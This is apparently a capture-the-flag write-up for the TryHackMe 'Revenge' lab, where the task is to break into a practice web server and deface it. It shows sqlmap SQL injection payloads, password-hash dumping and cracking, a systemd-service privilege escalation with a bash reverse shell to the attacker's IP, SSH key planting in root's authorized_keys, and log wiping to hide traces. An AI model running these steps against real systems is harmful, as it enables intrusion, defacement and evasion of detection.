<p align="center">
  THM : Revenge<br>
  Difficulty : Medium<br>
  Room link : https://tryhackme.com/room/revenge<br>
  <img src="https://i.imgur.com/Kf8zzbj.png">
</p>

## Summary

- [Reading the message from Billy](#reading-the-message-from-billy)
- [Nmap Scan](#nmap-scan)
- [Dirb Scan](#dirb-scan)
- [Website manual enumeration](#website-manual-enumeration)
- [SQL Injection](#sql-injection)
- [Get the flags](#get-the-flags)
- [Privilege escalation](#privilege-escalation)
- [Defacing the website](#defacing-the-website)
- [Conclusion](#conclusion)

## Reading the message from Billy

Billy Joel has sent us a message regarding the mission. Let's see what's in it :  
```
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy
```
Ok, our mission : Deface the website front page.
Like always, let's start an Nmap scan while we enumerate the website manually.

## Nmap Scan

```
┌──(attacker㉿AttackBox)-[~/Bureau/CTF/Revenge]
└─$ nmap 10.10.31.177 -A -p- -oN nmapResults.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 14:25 CEST
Nmap scan report for 10.10.31.177
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
```

There is only two open ports :  
- 22 (ssh)  
- 80 (http)  

## Dirb Scan

```
┌──(attacker㉿AttackBox)-[~/Bureau/CTF/Revenge]
└─$ dirb http://10.10.31.177/ /home/attacker/Documents/Outils/SecLists/Discovery/Web-Content/big.txt -o dirbResults.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirbResults.txt
START_TIME: Sun Sep  4 14:27:30 2022
URL_BASE: http://10.10.31.177/
WORDLIST_FILES: /home/attacker/Documents/Outils/SecLists/Discovery/Web-Content/big.txt

-----------------

GENERATED WORDS: 20465                                                         

---- Scanning URL: http://10.10.31.177/ ----
+ http://10.10.31.177/admin (CODE:200|SIZE:4983)                                                      
+ http://10.10.31.177/contact (CODE:200|SIZE:6906)                                                    
+ http://10.10.31.177/index (CODE:200|SIZE:8541)                                                      
+ http://10.10.31.177/login (CODE:200|SIZE:4980)                                                      
+ http://10.10.31.177/products (CODE:200|SIZE:7254)                                                   
==> DIRECTORY: http://10.10.31.177/static/
...
...
```

We can see an admin page, it may be useful. But there is no other hidden pages.

## Website manual enumeration

Let's take a look at the website :  
![alt text](https://i.imgur.com/NSliEu3.png)  

Two things got my attention here :  
- There is a product page -> Maybe we can find an SQL injection here  
- There is a login page -> Maybe we can laso find an SQL injection here  

## SQL Injection

So I tried to make an SQL injection in the login page, but I figured out that the login page was
not even working because we cannot even use the POST method on this page so... we cannot POST data...
obviously... Same for the admin page. For the contact page, there is no POST data except 
'action', which is not injectable.

Then I took a look at the products page :  
![alt text](https://i.imgur.com/VK54R3C.png)  

We can choose the product we want. Let's take a look at any of them :  
![alt text](https://i.imgur.com/eRn4lpa.png)  

We see in the URL that there is the id of the product. Maybe it is injectable ?  
So I used sqlmap to find out if it is injectable with the following command : `sqlmap -u http://10.10.31.177/products/1* --level=5 --risk=3 --dbs`
```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.31.177:80/products/1 AND 8844=8844

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.31.177:80/products/1 AND (SELECT 1539 FROM (SELECT(SLEEP(5)))tBUW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.31.177:80/products/-7384 UNION ALL SELECT 79,79,79,79,79,79,79,CONCAT(0x71766a6b71,0x6f705162447147666c767a52516e75414e426d75756f78766b644564636f785864716d63585a454f,0x716b787071)-- -
---
[14:59:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
```

The parameter is injectable. I used the option --dbs to list the existing databases :  
```
[14:59:46] [INFO] fetching database names
available databases [5]:
[*] duckyinc
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

```

Let's dump the duckyinc database with the parameters `-D duckyinc --dump`.
There is 3 tables we dumped :  
- product
- user
- system_user

I think that system_user is the most interesting table, let's take a look at it :  
```┌──(attacker㉿AttackBox)-[~/…/dump/duckyinc/dump/duckyinc]
└─$ cat system_user.csv
id,email,username,_password
1,sadmin@duckyinc.org,server-admin,$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a
2,kmotley@duckyinc.org,kmotley,$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa
3,dhughes@duckyinc.org,dhughes,$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK
```

We have 3 users and their password hash. Maybe we can try to use those credentials to login 
using SSH ? First, let's find out what hash type is used here.
![](https://i.imgur.com/uxKQrcs.png)  

Now we know it is Blowfish. Let's try to crack them using hashcat and the famous rockyou.txt 
wordlist. First, I will try to crack the password hash of server-admin user (This user may have some 
privileges that other users don't have because it's the server admin) :  
![](https://i.imgur.com/gDYBw28.png)  

We have the password for server-admin user ! Let's try to connect via SSH using those credentials :  
![](https://i.imgur.com/BNXWjnE.png)  

We are connected as server-admin !

## Get the flags 

So now we can get the first flags !  

The flag 1 is hidden in the user table of the duckyinc database :  
```
┌──(attacker㉿AttackBox)-[~/…/dump/duckyinc/dump/duckyinc]
└─$ cat user.csv | grep thm
6,ap@krasco.org,Krasco Org,mandrews,$2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC,thm{****************}
```

The flag 2 is located in the home directory of server-admin user :  
```
server-admin@duckyinc:~$ ls -la
total 44                                                                                               
drwxr-xr-x 5 server-admin server-admin 4096 Aug 12  2020 .                                             
drwxr-xr-x 3 root         root         4096 Aug 10  2020 ..                                            
lrwxrwxrwx 1 root         root            9 Aug 10  2020 .bash_history -> /dev/null                    
-rw-r--r-- 1 server-admin server-admin  220 Aug 10  2020 .bash_logout                                  
-rw-r--r-- 1 server-admin server-admin 3771 Aug 10  2020 .bashrc                                       
drwx------ 2 server-admin server-admin 4096 Aug 10  2020 .cache                                        
-rw-r----- 1 server-admin server-admin   18 Aug 10  2020 flag2.txt                                     
drwx------ 3 server-admin server-admin 4096 Aug 10  2020 .gnupg                                        
-rw------- 1 root         root           31 Aug 10  2020 .lesshst                                      
drwxr-xr-x 3 server-admin server-admin 4096 Aug 10  2020 .local                                        
-rw-r--r-- 1 server-admin server-admin  807 Aug 10  2020 .profile                                      
-rw-r--r-- 1 server-admin server-admin    0 Aug 10  2020 .sudo_as_admin_successful                     
-rw------- 1 server-admin server-admin 2933 Aug 12  2020 .viminfo                                      
server-admin@duckyinc:~$ cat flag2.txt                                                                 
thm{*********}
```

## Privilege escalation

Let's take a look at our sudo rights :  
```
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl
        restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

We can edit and restart the duckyinc.service service ! Let's elevate our privileges !
First, let's take a look at the duckyinc service to make it run our custom command :  
`sudoedit /etc/systemd/system/duckyinc.service`  

```
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```
(Before editing the service, make sure to backup it, like Billy tolds us earlier, we need to keep the website up !)
Let's change ExecStart value to make it run a custom shell script :  
`ExecStart=/dev/shm/exploit.sh`
And let's change user to have full control on the machine :  
`User=root`

Now, let's create our custom script in /dev/shm :  
```
server-admin@duckyinc:/dev/shm$ cat exploit.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.8.95.171/4242 0>&1
```

Don't forget to make it executable using `chmod +x exploit.sh`  

Let's run a netcat listener on our attacker machine : `nc -lnvp 4242`  

Now let's restart the service :  
```
server-admin@duckyinc:/dev/shm$ sudo /bin/systemctl daemon-reload
server-admin@duckyinc:/dev/shm$ sudo /bin/systemctl restart duckyinc.service
```

Go back to our netcat listener... and we are root !  
```
┌──(attacker㉿AttackBox)-[~]
└─$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.8.95.171] from (UNKNOWN) [10.10.31.177] 41810
bash: cannot set terminal process group (31109): Inappropriate ioctl for device
bash: no job control in this shell
root@duckyinc:/var/www/duckyinc# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@duckyinc:/var/www/duckyinc#
```

Let's replace the SSH public key of root user by our own public key to connect via SSH and get a better shell :  
On the target machine :  
```
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLAIo+aM+d9Ws60WYf3W7aB58o6JAtP/MjErDFSQ906DVSawgEFWxHxwka2cfDTBamI1if8ktqZUdxAFOYIj8ne55EbIddjIcGKHN2B6maEkW451fw33UHbNCvvW36C/P23yzeb5AHZFsiToCVs/SHdbT0XZPWHbol7AVdTttVD1FZDlZNJwcQXzKdVAGjbvngzeoEMEUMkvgl411mtWN3TzgvF4z+jVkXnhC5Ly6QpuHU+jBwWl8x8w8OQ1XNSLoAQ85zGPlfNFmevb5TiuO0BS80JgvKjRaA3TjefyjDgmGQ4ExkaX+qSzqeXv/w8DFoZp42ery/dJ49zIxhkGseJDv3SAuzZuoU/GDe9i6lD5KFPsPgpp8IbKdPRVAB9Wl0x2S2iIDGCvBybbyS5sKs7evrltDL+xNVUQliESjNYUi92CP1z56rMMub/5ONIGMbF/e4kz9F6DnMSU3aVvZESZFWId4a2v6OIKzUfHSizSWSs4HFbrnkxlAF678hK90= attacker@AttackBox' > /root/.ssh/authorized_keys
```

On our attacker machine : 
```
┌──(attacker㉿AttackBox)-[~/Bureau/CTF/Revenge]
└─$ ssh root@10.10.31.177 -i root_rsa 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


8 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


################################################################################
#                        Ducky Inc. Web Server 00080012                        #
#            This server is for authorized Ducky Inc. employees only           #
#                  All actiions are being monitored and recorded               #
#                    IP and MAC addresses have been logged                     #
################################################################################
Last login: Fri Aug 28 03:09:18 2020
root@duckyinc:~# 
```

I tried to find the third flag ...for a long time... I took a look at the hint and it told me this : Mission objectives

I wanted to do the objective after finding all the flags but ok !

## Defacing the website

Let's Deface this website !

I just edited the base.html file in /var/www/duckyinc/templates :  
- Added a trollface ASCII art
- Removed the footer
- Removed the main content
- Removed the menu bar on top of the page
- Changed the page title to "HACKED LOL EZ !!"
- Added a rick roll gif !
(Before editing this file, make sure to backup it like so : `cp /var/www/duckyinc/templates/base.html /var/www/duckyinc/templates/base.html.bak`, because Billy told us to not make irreversible damage)

After that, I restored the duckyinc.service file I edited before, and I restarted the service !
And look at the result :  
![alt text](https://i.imgur.com/mzgOLno.png)

Now, let's take a look at the /root directory to see if there is a flag...
```
root@duckyinc:~# ls
flag3.txt
```
And yes ! Let's get it to finish the job !
```
root@duckyinc:~# cat flag3.txt 
thm{*****************}
```

Now, let's remove our traces:  
- Remove our SSH public key in /root/.ssh
- Remove all logs in /var/log
- Remove our script in /dev/shm (If it was not automaticaly deleted)
- .bash_history for root user and server-admin user are already linked to /dev/null so they will not save every commands we used
(I don't know if there is any other traces to remove, it's the first time I do this !)

## Conclusion
This room was very fun to do. It is the first time I do a CTF where you are the 
"bad hacker" or "black hat" ! It was very easy to escalate our privileges in my opinion, but very cool !
Thanks for this room !
